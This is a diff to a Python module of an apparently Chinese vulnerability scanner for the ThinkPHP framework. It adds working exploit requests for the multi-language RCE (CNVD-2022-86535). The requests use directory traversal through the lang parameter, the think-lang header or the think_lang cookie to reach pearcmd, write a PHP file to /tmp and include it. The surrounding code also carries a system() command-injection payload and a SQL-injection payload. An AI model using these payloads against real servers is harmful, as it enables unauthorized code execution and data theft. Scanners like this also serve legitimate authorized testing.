@@ -23,11 +23,15 @@
             CVE-2018-1002015
                 Payload: https://www.cnblogs.com/defyou/p/15762860.html
 
+        6. ThinkPHP 多语言RCE
+            CNVD-2022-86535
+                Payload: https://mp.weixin.qq.com/s/jECbQ4KodbCrEvoCQFSosw
+
 其它奇奇怪怪的Payload: https://baizesec.github.io/
 '''
 
 from lib.initial.config import config
-from lib.tool.md5 import md5, random_md5
+from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
 from lib.tool.thread import thread
 from lib.tool import head
 from payloads.ThinkPHP._2_x_rce import _2_x_rce_scan
@@ -35,17 +39,21 @@ from payloads.ThinkPHP._5_ids_sqlinject import _5_ids_sqlinject_scan
 from payloads.ThinkPHP.cnnvd_201901_445 import cnnvd_201901_445_scan
 from payloads.ThinkPHP.cnvd_2018_24942 import cnvd_2018_24942_scan
 from payloads.ThinkPHP.cve_2018_1002015 import cve_2018_1002015_scan
+from payloads.ThinkPHP.cnvd_2022_86535 import cnvd_2022_86535_scan
 
 class ThinkPHP():
     def __init__(self):
         self.timeout = config.get('timeout')
         self.headers = config.get('headers')
         self.proxies = config.get('proxies')
+        self.proxy = config.get('proxy')
 
         self.app_name = 'ThinkPHP'
         self.md = md5(self.app_name)
         self.cmd = 'echo ' + self.md
 
+        self.random_num = random_int_1(6)
+        
         self.cnvd_2018_24942_payloads = [
             {
                 'path': 'index.php?s=index/\\think\Request/input&filter[]=system&data={}'.format(self.cmd),
@@ -104,7 +112,71 @@ class ThinkPHP():
             }
         ]
 
-        # * 以下payload没有找到测试环境, 暂时没写poc
+        if self.headers.get('Cookie'):
+            cookie_payload = 'think_lang=../../../../../../../../usr/local/lib/php/pearcmd'
+            new_cookie = self.headers.get('Cookie') + '; ' + cookie_payload
+        else:
+            new_cookie = 'think_lang=../../../../../../../../usr/local/lib/php/pearcmd'
+        self.cnvd_2022_86535_payloads = [
+            {
+                'path': 'index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=md5({})?>+/tmp/{}.php'.format(self.random_num, self.random_num),
+                'headers': head.merge(self.headers, {})
+            },
+            {
+                'path': 'index.php?lang=../../../../../../../../tmp/{}'.format(self.random_num),
+                'headers': head.merge(self.headers, {})
+            },
+            {
+                'path': 'public/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=md5({})?>+/tmp/{}.php'.format(self.random_num, self.random_num),
+                'headers': head.merge(self.headers, {})
+            },
+            {
+                'path': 'public/index.php?lang=../../../../../../../../tmp/{}'.format(self.random_num),
+                'headers': head.merge(self.headers, {})
+            },
+            {
+                'path': 'index.php?+config-create+/<?=md5({})?>+/tmp/{}.php'.format(self.random_num, self.random_num),
+                'headers': head.merge(self.headers, {
+                    'think-lang': '../../../../../../../../usr/local/lib/php/pearcmd'
+                })
+            },
+            {
+                'path': 'index.php?lang=../../../../../../../../tmp/{}'.format(self.random_num),
+                'headers': head.merge(self.headers, {})
+            },
+                        {
+                'path': 'public/index.php?+config-create+/<?=md5({})?>+/tmp/{}.php'.format(self.random_num, self.random_num),
+                'headers': head.merge(self.headers, {
+                    'think-lang': '../../../../../../../../usr/local/lib/php/pearcmd'
+                })
+            },
+            {
+                'path': 'public/index.php?lang=../../../../../../../../tmp/{}'.format(self.random_num),
+                'headers': head.merge(self.headers, {})
+            },
+            {
+                'path': 'index.php?+config-create+/<?=md5({})?>+/tmp/{}.php'.format(self.random_num, self.random_num),
+                'headers': head.merge(self.headers, {
+                    'Cookie': new_cookie
+                })
+            },
+            {
+                'path': 'index.php?lang=../../../../../../../../tmp/{}'.format(self.random_num),
+                'headers': head.merge(self.headers, {})
+            },
+            {
+                'path': 'public/index.php?+config-create+/<?=md5({})?>+/tmp/{}.php'.format(self.random_num, self.random_num),
+                'headers': head.merge(self.headers, {
+                    'Cookie': new_cookie
+                })
+            },
+            {
+                'path': 'public/index.php?lang=../../../../../../../../tmp/{}'.format(self.random_num),
+                'headers': head.merge(self.headers, {})
+            }
+        ]
+
+        # * 以下payload暂时没写poc
         self.thinkphp_5_options_sqlinject_payloads = [
             {
                 'path': 'index?options=id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23 **',
@@ -150,7 +222,8 @@ class ThinkPHP():
             thread(target=self.thinkphp_5_ids_sqlinject_scan, url=url),
             thread(target=self.cnnvd_201901_445_scan, url=url),
             thread(target=self.cnvd_2018_24942_scan, url=url),
-            thread(target=self.cve_2018_1002015_scan, url=url)
+            thread(target=self.cve_2018_1002015_scan, url=url),
+            thread(target=self.cnvd_2022_86535_scan, url=url),
         ]
 
 ThinkPHP.thinkphp_2_x_rce_scan = _2_x_rce_scan
@@ -158,5 +231,6 @@ ThinkPHP.thinkphp_5_ids_sqlinject_scan = _5_ids_sqlinject_scan
 ThinkPHP.cnnvd_201901_445_scan = cnnvd_201901_445_scan
 ThinkPHP.cnvd_2018_24942_scan = cnvd_2018_24942_scan
 ThinkPHP.cve_2018_1002015_scan = cve_2018_1002015_scan
+ThinkPHP.cnvd_2022_86535_scan = cnvd_2022_86535_scan
 
 thinkphp = ThinkPHP()
